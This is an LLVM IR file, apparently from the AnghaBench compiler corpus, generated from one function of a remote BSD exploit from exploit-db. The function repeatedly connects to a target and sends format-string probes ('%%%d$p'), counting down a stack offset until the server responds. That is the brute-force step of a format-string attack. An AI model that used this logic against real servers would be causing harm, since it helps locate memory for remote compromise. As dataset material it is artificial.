; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_get_ce_number.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_get_ce_number.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BIGBUF = common dso_local global i32 0, align 4
@END_BRUTEFORCE_STACK = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"sm00ny\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"%%%d$p\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @get_ce_number(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %14 = load i32, i32* @BIGBUF, align 4
  %15 = zext i32 %14 to i64
  %16 = call i8* @llvm.stacksave()
  store i8* %16, i8** %7, align 8
  %17 = alloca i8, i64 %15, align 16
  store i64 %15, i64* %8, align 8
  %18 = load i32, i32* @BIGBUF, align 4
  %19 = zext i32 %18 to i64
  %20 = alloca i8, i64 %19, align 16
  store i64 %19, i64* %11, align 8
  %21 = load i32, i32* @BIGBUF, align 4
  %22 = zext i32 %21 to i64
  %23 = alloca i8, i64 %22, align 16
  store i64 %22, i64* %12, align 8
  %24 = load i32, i32* @END_BRUTEFORCE_STACK, align 4
  store i32 %24, i32* %6, align 4
  br label %25

25:                                               ; preds = %50, %2
  %26 = load i8*, i8** %3, align 8
  %27 = load i32, i32* %4, align 4
  %28 = call i32 @connect_to(i8* %26, i32 %27)
  store i32 %28, i32* %5, align 4
  %29 = load i32, i32* %5, align 4
  %30 = trunc i64 %15 to i32
  %31 = call i32 @recv(i32 %29, i8* %17, i32 %30, i32 0)
  store i32 %31, i32* %10, align 4
  %32 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %33 = load i32, i32* %6, align 4
  %34 = call i32 (i8*, i8*, ...) @sprintf(i8* %20, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i32 %33)
  %35 = call i8* @get_request(i8* %20, i8* %23)
  store i8* %35, i8** %13, align 8
  %36 = load i32, i32* %5, align 4
  %37 = load i8*, i8** %13, align 8
  %38 = call i32 @send_data(i32 %36, i8* %37)
  %39 = trunc i64 %15 to i32
  %40 = call i32 @memset(i8* %17, i32 0, i32 %39)
  %41 = load i32, i32* %5, align 4
  %42 = trunc i64 %15 to i32
  %43 = call i32 @recv(i32 %41, i8* %17, i32 %42, i32 0)
  store i32 %43, i32* %10, align 4
  %44 = load i32, i32* %5, align 4
  %45 = call i32 @close_socket(i32 %44)
  %46 = load i32, i32* %10, align 4
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %49

48:                                               ; preds = %25
  br label %53

49:                                               ; preds = %25
  br label %50

50:                                               ; preds = %49
  %51 = load i32, i32* %6, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* %6, align 4
  br label %25

53:                                               ; preds = %48
  %54 = load i32, i32* %6, align 4
  %55 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %55)
  ret i32 %54
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @connect_to(i8*, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i8* @get_request(i8*, i8*) #2

declare dso_local i32 @send_data(i32, i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @close_socket(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
